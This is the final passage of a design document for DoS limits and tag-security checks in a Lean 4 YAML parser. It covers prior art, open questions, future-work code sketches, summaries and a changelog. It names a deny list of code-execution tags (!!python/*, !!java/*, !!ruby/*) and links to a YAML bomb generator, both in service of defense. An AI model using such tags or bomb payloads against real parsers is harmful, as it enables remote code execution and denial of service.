## References

### Standards & Specifications

- [YAML 1.2.2 §3.2.1 – Node Representation](https://yaml.org/spec/1.2.2/#321-representation-graph): "The representation is acyclic" — cyclic aliases violate spec
- [CWE-776: Improper Restriction of Recursive Entity References](https://cwe.mitre.org/data/definitions/776.html)
- [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)

### Prior Art

**SnakeYAML** (Java):
- `maxAliasesForCollections` (default: 50): maximum aliases in a single collection
- `codePointLimit` (default: 3MB): maximum characters in input
- See: [CVE-2022-38752](https://nvd.nist.gov/vuln/detail/CVE-2022-38752), [CVE-2022-41854](https://nvd.nist.gov/vuln/detail/CVE-2022-41854)

**PyYAML** (Python):
- No default limits (historically vulnerable)
- Community advice: wrap parser with custom loaders imposing limits
- See: [Billion Laughs Attack Explanation](https://en.wikipedia.org/wiki/Billion_laughs_attack#YAML)

**go-yaml** (Go):
- `SetReaderLimit`: maximum bytes to read from input (default: 10MB)
- `SetDecodeDepth`: maximum nesting depth (default: 10,000)

**ruamel.yaml** (Python):
- `max_aliases` (default: None): user-configurable alias limit
- `allow_duplicate_keys` (default: True): can reject duplicates as attack vector

### Attack Demonstrations

- [YAML Bomb Generator](https://github.com/kushaldas/yaml-bomb): Tool for constructing exponential expansion payloads
- [OWASP Testing Guide – XML Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection): XML billion laughs applies to YAML via aliases

## Open Questions

1. **Should we enforce limits by default?**
   - **Option A**: `ParserLimits.default` (current proposal) — medium strictness, enforced unless `limits := .unlimited`
   - **Option B**: `ParserLimits.unlimited` by default — backwards compatible, opt-in security
   - **Recommendation**: Option A. Security-by-default is better; users needing unlimited can opt out explicitly.

2. **Should `compose` fail on limit violations or silently truncate?**
   - **Option A**: Fail with `Except` (current proposal) — clear error feedback
   - **Option B**: Truncate and emit warning — partial parsing, no hard failure
   - **Recommendation**: Option A. Partial parsing breaks YAML semantics (alias substitution is all-or-nothing).

3. **Should limits be per-document or per-stream?**
   - Current proposal: hybrid (some per-document like `maxAnchors`, some per-stream like `maxInputBytes`)
   - Alternative: all limits per-stream, aggregate across documents
   - **Recommendation**: Keep hybrid. Per-document limits prevent one malicious document from poisoning a multi-document stream.

4. **How to handle limit violations in streaming contexts?**
   - If `parseYaml` processes multi-document streams, should one limit violation abort the entire stream or skip that document?
   - **Recommendation**: Abort entire stream. Partial success is confusing; user can parse documents individually if needed.

5. **Should we add a `maxDepth` to alias chains separately from collection nesting?**
   - Current: `maxAliasDepth` (chain length) + `maxDepth` (collection nesting) are independent
   - Alternative: single combined depth limit
   - **Recommendation**: Keep separate. They measure different things: `maxAliasDepth` bounds resolution passes, `maxDepth` bounds stack usage.

## Future Work

### 1. Incremental Parsing with Limits

Streaming parser that enforces limits **before** buffering entire input:

```lean
def parseYamlStreaming (stream : IO.FS.Stream) (limits : ParserLimits := {})
    : IO (Except String (Array YamlDocument)) := do
  let mut bytesRead := 0
  let mut buffer := ""

  for chunk in stream.readChunks do
    bytesRead := bytesRead + chunk.utf8ByteSize
    if bytesRead > limits.document.maxInputBytes then
      return .error s!"input stream exceeds {limits.document.maxInputBytes} bytes"
    buffer := buffer ++ chunk

  parseYaml buffer limits
```

**Benefit**: Rejects huge inputs without allocating memory for entire string.

### 2. Resource Tracking

More sophisticated limits based on actual resource consumption:

```lean
structure ResourceLimits where
  maxMemoryBytes : Nat := 100_000_000  -- 100 MB
  maxCpuMilliseconds : Nat := 5_000     -- 5 seconds
```

**Benefit**: Protects against classes of attacks not covered by structural limits (e.g., pathological regex backtracking in tag patterns).

**Challenges**: Requires FFI to OS-level resource APIs; hard to reason about in proofs.

### 3. Fuzzing with Limits

Use property-based testing to verify no false negatives:

```lean
/-- Property: If valid YAML parses without limits, it should parse with generous limits -/
def prop_limits_no_false_negatives (yaml : String) : Bool :=
  match (parseYaml yaml .unlimited, parseYaml yaml .permissive) with
  | (.ok docs₁, .ok docs₂) => docs₁ == docs₂  -- same result
  | (.ok _, .error _) => false                 -- false negative!
  | (.error _, _) => true                      -- either both fail or only limited fails
```

Use AFL/libFuzzer with this property to discover edge cases.

---

## Summary: Comprehensive YAML Security

This document addresses **two critical vulnerability classes** in YAML parsers:

### 1. Denial-of-Service (DoS) Protection

**Billion laugh attacks** and resource exhaustion prevented through:
- Alias expansion limits (depth, count, resolved nodes)
- Structural limits (nesting depth, collection sizes, scalar sizes)
- Document limits (stream size, anchor count)
- Cycle detection

**Real-world impact**: PyYAML, SnakeYAML, and other parsers have suffered CVEs from billion laugh attacks. Resource limits are **essential** for parsing untrusted input.

### 2. Arbitrary Code Execution (ACE) Protection

**Dangerous language-specific tags** blocked through:
- Tag policy enforcement (whitelist/blacklist/Core Schema only)
- Language-specific tag rejection (!!python/*, !!java/*, !!ruby/*)
- Custom tag handle validation
- Tag length limits

**Real-world impact**: PyYAML's `yaml.load()` and SnakeYAML have enabled **remote code execution** in countless applications. Tag validation is **critical** for security.

### Defense-in-Depth Strategy

The combined approach provides layered security:

1. **Input validation** (tag security): Reject dangerous patterns before processing
2. **Resource limits** (DoS protection): Prevent exhaustion during processing
3. **Error transparency** (structured errors): Enable security monitoring and auditing
4. **Safe-by-default** (strict mode): Conservative limits unless explicitly relaxed

**Recommendation**: Always use `ParserLimits.strict` for untrusted input. Only relax limits after security review.

## Summary: Benefits of Structured Error Types

### For Users

1. **Precise error handling**: Pattern match on specific error types for targeted recovery
2. **Better diagnostics**: Error messages include context (paths, counts, limits) for debugging
3. **Graceful degradation**: Can retry with relaxed limits on `LimitError` but not `SyntaxError`
4. **Security auditing**: Machine-readable error data enables DoS detection, attack pattern recognition, and rate limiting
5. **Threat intelligence**: Dangerous tag detections can trigger security alerts and incident response

### For Implementers

1. **Type safety**: Exhaustiveness checking prevents missing error cases
2. **Maintainability**: Adding new errors doesn't require string parsing updates
3. **Refactoring confidence**: Compiler catches all sites needing updates when errors change
4. **Testing**: Can assert on specific error types, not string matching

### For Verification

1. **Proof modularity**: Separate theorems for each error category
2. **Strong specifications**: Error constructors are predicates over parser state
3. **Decidability**: Error type equality is decidable, enabling `native_decide` proofs
4. **Composability**: Error type lifting (`AliasLimitError → LimitError → ParseError`) preserves semantics

### Migration Path

- **Phase 1** (Week 1): Implement error types, keep `Except String` wrappers for compatibility
- **Phase 2** (Week 2-3): Migrate internal code to structured errors
- **Phase 3** (Week 4+): Deprecate string-based API, remove wrappers
- **Phase 4** (Month 3-6): Add verification proofs for error type correctness

The structured approach adds minimal overhead (5 days implementation) while providing long-term benefits for safety, usability, and verification.

---

**Document version**: 3.0
**Last updated**: 2026-03-11
**Changelog**:
- v3.0: **MAJOR**: Added tag security to prevent arbitrary code execution
  - Added threat model for ACE via unsafe tags (!!python/*, !!java/*, !!ruby/*)
  - Added `TagSecurityError` inductive with 7 security violation types
  - Added `TagLimits` configuration with `TagPolicy` (whitelist/blacklist/Core Schema)
  - Added dangerous tag detection for Python, Java, Ruby, PHP, Perl
  - Added Core Schema whitelist (!!str, !!int, !!float, !!bool, !!null, !!seq, !!map)
  - Added tag length limits and handle prefix validation
  - Added comprehensive security testing examples and patterns
  - Updated all configurations to include tag security (`.strict`, `.permissive`, `.safeTagsOnly`)
  - Extended implementation time from 5 to 7-8 days, proof time from 6-12 to 8-14 weeks
- v2.0: Refactored to use structured inductive error types instead of `Except String`
  - Added error type hierarchy: `AliasLimitError` | `StructuralLimitError` | `DocumentLimitError`
  - Added `ParseError` distinguishing syntax vs. limit violations
  - Added error handling patterns and migration guide
  - Updated all API signatures and proof theorems
  - Added design rationale and alternatives analysis
- v1.0: Initial draft with string-based errors (DoS prevention only)

**Author**: Generated for lean4-yaml-verified.iterators

**Security Note**: Tag validation is **critical** for preventing remote code execution. Always use `ParserLimits.strict` or `ParserLimits.safeTagsOnly` when parsing untrusted input. The `ParserLimits.unlimited` configuration should NEVER be used with external input.
